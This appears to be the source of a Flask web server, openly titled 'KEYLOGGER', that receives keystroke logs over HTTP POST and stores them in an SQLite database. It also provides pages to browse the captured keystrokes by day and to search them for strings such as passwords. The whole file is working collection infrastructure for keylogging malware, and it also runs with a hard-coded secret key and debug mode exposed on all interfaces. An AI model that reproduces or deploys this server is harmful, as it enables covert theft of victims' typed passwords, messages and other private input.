from flask import Flask, request, render_template
import sqlite3
from datetime import datetime

app = Flask(__name__)
app.secret_key = "supersecret"  # needed if you want do to more

DB_FILE = "keylogs.db"


def init_db():
    """make the database if not already made"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS keylogs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            logs TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()


@app.route("/", methods=["GET"])
def home():
    """Homepage"""
    return render_template("home.html", splash_title="KEYLOGGER")


@app.route("/logs", methods=["POST"])
def receive_logs():
    """receive logs and save them"""
    try:
        keylogs = request.form.get("keylogs", "")

        if not keylogs.strip():
            return "No data received", 400

        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO keylogs (timestamp, logs) VALUES (?, ?)",
                       (datetime.now().isoformat(), keylogs))
        conn.commit()
        conn.close()

        print("new logs.")
        return "Logs received", 200

    except Exception as e:
        return f"Error: {e}", 500


@app.route("/view", methods=["GET"])
def view_logs():
    """view logs sorted by day"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT timestamp, logs FROM keylogs ORDER BY timestamp DESC")
    rows = cursor.fetchall()
    conn.close()

    logs_by_day = {}
    for ts, log in rows:
        day = ts.split("T")[0]
        logs_by_day.setdefault(day, []).append((ts, log))

    return render_template("view.html", logs_by_day=logs_by_day, splash_title="VIEW LOGS")


@app.route("/search", methods=["GET"])
def search_logs():
    """search in saved logs"""
    query = request.args.get("q", "").strip()

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    if query:
        cursor.execute("SELECT timestamp, logs FROM keylogs WHERE logs LIKE ? ORDER BY timestamp DESC", (f"%{query}%",))
        rows = cursor.fetchall()
    else:
        rows = []
    conn.close()

    return render_template("search.html", query=query, rows=rows, splash_title="SEARCH")


if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000, debug=True)
